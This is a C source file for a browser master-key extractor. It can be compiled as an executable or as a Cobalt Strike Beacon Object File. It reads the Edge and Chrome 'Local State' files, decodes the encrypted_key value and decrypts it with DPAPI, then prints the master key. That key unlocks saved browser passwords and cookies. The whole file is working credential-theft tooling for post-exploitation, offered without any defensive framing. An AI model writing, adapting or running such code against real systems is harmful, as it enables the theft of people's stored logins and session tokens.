// Browser Master Encryption Key Extractor
//
// If compiled as an exe: gcc decrypt.c -o decrypt.exe -lshlwapi -lcrypt32
// If compiled as a bof:  gcc decrypt.c -c -o decrypt.o -DCOMPILE_BOF

#include <windows.h>
#include <stdio.h>

#pragma GCC diagnostic ignored "-Wint-conversion"
#define VERBOSE TRUE

FARPROC Resolver(CHAR *lib, CHAR *func);
VOID GetFileContent(CHAR *path, CHAR **output);
VOID GetMasterKey(BYTE *cipher, DWORD keySize);
VOID GetEncryptionKeyFromFile(CHAR *path);
VOID ExtractKey(CHAR *data, CHAR **key);

#ifdef COMPILE_BOF

#warning "Compiling the BOF version of the code"

#include "beacon.h"

#define CSIDL_LOCAL_APPDATA 0x001c

#define IMPORT_RESOLVE FARPROC GlobalAlloc = Resolver("kernel32", "GlobalAlloc"); \
    FARPROC GlobalFree = Resolver("kernel32", "GlobalFree"); \
    FARPROC memcpy = Resolver("msvcrt", "memcpy"); \
    FARPROC CryptUnprotectData = Resolver("crypt32", "CryptUnprotectData");  \
    FARPROC GetLastError = Resolver("kernel32", "GetLastError");  \
    FARPROC SHGetFolderPath = Resolver("shell32", "SHGetFolderPathA");  \
    FARPROC PathAppend = Resolver("shlwapi", "PathAppendA");  \
    FARPROC CryptStringToBinary = Resolver("crypt32", "CryptStringToBinaryA");  \
    FARPROC strlen = Resolver("msvcrt", "strlen"); \
    FARPROC strstr = Resolver("msvcrt", "strstr"); \
    FARPROC strncpy = Resolver("msvcrt", "strncpy"); \
    FARPROC sprintf = Resolver("msvcrt", "sprintf"); \
    FARPROC CreateFile = Resolver("kernel32", "CreateFileA"); \
    FARPROC GetFileSize = Resolver("kernel32", "GetFileSize"); \
    FARPROC ReadFile = Resolver("kernel32", "ReadFile"); \
    FARPROC CloseHandle = Resolver("kernel32", "CloseHandle"); \
    FARPROC GetFileAttributes = Resolver("kernel32", "GetFileAttributesA");

#define printf(format, args...) { BeaconPrintf(CALLBACK_OUTPUT, format, ## args); }
DECLSPEC_IMPORT FARPROC WINAPI kernel32$GetProcAddress(HANDLE, CHAR*);
DECLSPEC_IMPORT HANDLE WINAPI kernel32$LoadLibraryA(CHAR*);

#else

#warning "Compiling the EXE version of the code"
#include <Shlwapi.h>
#include <shlobj.h>

#define IMPORT_RESOLVE ""

#endif

FARPROC Resolver(CHAR *lib, CHAR *func) {
#ifdef COMPILE_BOF
    FARPROC ptr = kernel32$GetProcAddress(kernel32$LoadLibraryA(lib), func);
    if(VERBOSE) {
        printf("%s$%s located at 0x%p\n", lib, func, ptr);
    }
    return ptr;
#else
    FARPROC ptr = GetProcAddress(LoadLibraryA(lib), func);
    if(VERBOSE) {
        printf("%s!%s located at 0x%p\n", lib, func, ptr);
    }
    return ptr;
#endif
}

void GetMasterKey(BYTE *cipher, DWORD keySize) {
    IMPORT_RESOLVE;
    DATA_BLOB db;
    DATA_BLOB final;
    db.pbData = cipher;
    db.cbData = keySize;
    BOOL res = CryptUnprotectData(&db, NULL, NULL, NULL, NULL, 0, &final);
    if(res) {
        CHAR *output = (CHAR*)GlobalAlloc(GPTR, (final.cbData * 4) + 1);
        DWORD i = 0;
        for(i = 0; i < final.cbData; i++) {
            sprintf(output, "%s\\x%02x", output, final.pbData[i]);
        }
        printf("Master key is: %s\n", output);
        GlobalFree(output);
    }
}

VOID GetEncryptionKeyFromFile(CHAR *path) {
    IMPORT_RESOLVE;
    CHAR appdata[256];
    CHAR *data = NULL;
    CHAR *key = NULL;
    SHGetFolderPath(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, appdata);
    PathAppend(appdata, path);
    printf("Fetching browser master key using the following path: %s\n", appdata);

    GetFileContent(appdata, &data);
    if(data == NULL) {
        printf("ERROR: Local State data was not retrieved");
        return;
    }
    ExtractKey(data, &key);
    GlobalFree(data);

    if(key == NULL) {
        printf("ERROR: encrypted key data was not extracted");
        return;
    }

    printf("Base64 key is: %s\n", key);

    DWORD dwOutSize = 0;
    CryptStringToBinary(key, strlen(key), CRYPT_STRING_BASE64, NULL, &dwOutSize, NULL, NULL);
    printf("Base64 decoded key need %d bytes\n", dwOutSize);

    BYTE* byteKey = (BYTE*)GlobalAlloc(GPTR, dwOutSize);
    CryptStringToBinary(key, strlen(key), CRYPT_STRING_BASE64, byteKey, &dwOutSize, NULL, NULL);   
    byteKey += 5;

    GetMasterKey(byteKey, dwOutSize);
    GlobalFree(key);
    GlobalFree(byteKey - 5);
}

VOID ExtractKey(CHAR *data, CHAR **key) {
    IMPORT_RESOLVE;
    CHAR pattern[] = "\"encrypted_key\":\"";
    CHAR* start = strstr(data, pattern);

    if(start == NULL) {
        printf("ERROR: Encrypted key pattern not found");
        return;
    }

    start += strlen(pattern);
    data = start;
    CHAR *end = strstr(data, "\"");
    if(end == NULL) {
        printf("ERROR: end of encrypted key pattern not found");
        return;
    }

    DWORD dwSize = end - start;

    *key = (CHAR*)GlobalAlloc(GPTR, dwSize + 1);
    printf("Allocating %d bytes for the base64 key\n", dwSize);
    strncpy(*key, data, dwSize);
}

VOID GetFileContent(CHAR *path, CHAR **output) {
    IMPORT_RESOLVE;
    DWORD dwFile = GetFileAttributes(path);
    DWORD dwRead = 0;
    if(dwFile != INVALID_FILE_ATTRIBUTES) {
        HANDLE hFile = CreateFile(path, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
        if(hFile == INVALID_HANDLE_VALUE) {
            printf("Failed to get a file HANDLE on %s. ERROR: %d\n", path, GetLastError());
            return;
        }

        DWORD dwSize = GetFileSize(hFile, NULL);
        printf("%s size is %d bytes\n", path, dwSize);
        *output = (CHAR*)GlobalAlloc(GPTR, dwSize + 1);
        ReadFile(hFile, *output, dwSize, &dwRead, NULL);
        CloseHandle(hFile);
    } else {
        printf("%s file not found\n", path);
    }
}

VOID go(char *argv, int argc) {
    printf("Extracting Edge Key\n---------------------------------------------\n");
    GetEncryptionKeyFromFile("\\Microsoft\\Edge\\User Data\\Local State");
    printf("\r\nExtracting Chrome Key\n---------------------------------------------\n");
    GetEncryptionKeyFromFile("\\Google\\Chrome\\User Data\\Local State");
    printf("\nCompleted\n");
}

#ifndef COMPILE_BOF

int main() {
    go(NULL, 0);
    return 0;
}

#endif
